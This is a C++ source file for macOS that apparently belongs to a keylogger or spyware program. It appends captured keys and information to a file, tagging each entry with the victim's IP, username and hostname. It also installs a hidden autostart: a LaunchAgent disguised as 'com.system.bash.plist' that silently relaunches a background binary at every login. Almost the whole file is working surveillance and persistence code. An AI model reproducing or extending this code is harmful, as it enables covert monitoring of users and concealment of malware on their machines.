#include "file_reader.h"
#include <fstream>

using namespace std;

bool FileExists(const string& filename) {
    ifstream file(filename);
    return file.good();
}

void WriteToOutputFile(const std::wstring& key, const std::string& info) {
    wfstream file(FILE_NAME, ios::app); 

    if (file.is_open()) {
        locale utf8_locale("ru_RU.UTF-8");
        file.imbue(utf8_locale);

        std::string inrtf;
        std::string device_ip;
        std::tie(inrtf, device_ip) = GetDeviceIP();

        string sys_info = "=INTERFACE=" + inrtf 
                            + "=DEVICE_IP=" 
                            + device_ip 
                            + "=USERNAME=" 
                            + GetUserName() 
                            + "=HOST_NAME=" 
                            + GetHostName() 
                            + "=\n";
        for(char c : sys_info) {
            file << c;
        };
        file << key;
        for(char c : info) {
            file << c;
        };
        file << L"=\n";
        file.close(); 
    } else {
        // cerr << "Не удалось открыть файл для записи." << endl;
    }
}

void CreateLaunchAgentFile(char* path) {
    string file_path = string(getenv("HOME")) + "/Library/LaunchAgents/com.system.bash.plist";
    string bash_script_path = string(getenv("HOME")) + "/Library/LaunchAgents/system.bash.sh";
    string program_name  = "CppBackgroundWatcher";
    std::string destination_file_path = string(getenv("HOME")) + "/Library/LaunchAgents";

    if (!FileExists(file_path)) {
        // system(string("chmod 777 /Library/LaunchDaemons/").c_str());
        string copy_command = "sudo cp "
                                + static_cast<string>(path)
                                + "/CppBackgroundWatcher "
                                + destination_file_path
                                + "/CppBackgroundWatcher";
        int copy_command_result = system(copy_command.c_str());
        if (copy_command_result != 0) {
            // std::cerr << "Ошибка при копировании файла." << std::endl;
        }

        ofstream file(file_path);
        if (file.is_open()) {
            file << "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" << endl;
            file << "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">" << endl;
            file << "<plist version=\"1.0\">" << endl;
            file << "<dict>" << endl;
            file << "    <key>Label</key>" << endl;
            file << "    <string>com.system.bash.plist</string>" << endl;
            file << "    <key>ProgramArguments</key>" << endl;
            file << "    <array>" << endl;
            file << "        <string>" << destination_file_path << '/' << "system.bash.sh" << "</string>" << endl;
            file << "    </array>" << endl;
            file << "    <key>RunAtLoad</key>" << endl;
            file << "    <true/>" << endl;
            file << "</dict>" << endl;
            file << "</plist>" << endl;
            file.close();

            // cout << "Файл успешно создан: " << file_path << endl;
        } else {
            // cerr << "Не удалось открыть файл для записи. com.system.bash.plist" << endl;
        }

        ofstream bash_file(bash_script_path);
        if(bash_file.is_open()) {
            bash_file << "nohup ./CppBackgroundWatcher &" << endl;
            bash_file.close();

            // cout << "Файл успешно создан: system.bash.sh" << endl;
        } else {
            // cerr << "Не удалось открыть файл для записи. system.bash.sh" << endl;
        }

        ReloadLaunchConfiguration();
    }
}